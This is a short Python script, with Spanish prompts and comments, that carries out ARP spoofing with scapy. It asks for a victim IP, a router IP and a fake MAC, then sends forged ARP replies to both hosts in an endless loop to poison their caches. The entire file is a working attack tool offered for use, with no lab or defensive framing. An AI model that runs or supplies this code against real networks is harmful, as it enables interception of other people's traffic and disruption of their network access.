import subprocess
from scapy.all import ARP, Ether, sendp, conf, get_if_hwaddr, get_if_list
import time

def get_mac(ip):
    try:
        output = subprocess.check_output(["arping", "-c", "1", "-I", "eth0", ip])
        mac_address = None
        for line in output.decode().split("\n"):
            if "bytes from" in line:
                mac_address = line.split()[3]
                break
        return mac_address
    except Exception as e:
        print(f"Error al obtener la MAC para {ip}: {e}")
        return None

def arp_spoof(victim_ip, router_ip, fake_mac):
    victim_mac = get_mac(victim_ip)
    router_mac = get_mac(router_ip)

    if victim_mac is None:
        print(f"No se pudo obtener la MAC de la víctima {victim_ip}.")
        return

    if router_mac is None:
        print(f"No se pudo obtener la MAC del router {router_ip}.")
        return

    print(f"MAC de la víctima: {victim_mac}")
    print(f"MAC del router: {router_mac}")

    iface = "eth0"
    print(f"Usando la interfaz: {iface}")

    # Obtener la dirección MAC de la interfaz de ataque
    attacker_mac = get_if_hwaddr(iface)
    print(f"MAC del atacante (interfaz {iface}): {attacker_mac}")

    victim_arp = Ether(src=attacker_mac, dst=victim_mac)/ARP(op=2, hwsrc=fake_mac, psrc=router_ip, hwdst=victim_mac, pdst=victim_ip)
    router_arp = Ether(src=attacker_mac, dst=router_mac)/ARP(op=2, hwsrc=fake_mac, psrc=victim_ip, hwdst=router_mac, pdst=router_ip)

    # Modo de depuración para imprimir los paquetes
    print("Paquete ARP para la víctima:")
    victim_arp.show()
    print("\nPaquete ARP para el router:")
    router_arp.show()

    while True:
        sendp(victim_arp, iface=iface, loop=1, verbose=False)
        sendp(router_arp, iface=iface, loop=1, verbose=False)
        time.sleep(2)

if __name__ == "__main__":
    victim_ip = input("Ingrese la IP de la víctima: ")
    router_ip = input("Ingrese la IP del router: ")
    fake_mac = input("Ingrese la MAC falsa que desea utilizar: ")

    try:
        print(f"Comenzando ARP Spoofing contra {victim_ip} haciéndole creer que {router_ip} tiene la MAC {fake_mac}")
        arp_spoof(victim_ip, router_ip, fake_mac)
    except KeyboardInterrupt:
        print("ARP Spoofing detenido.")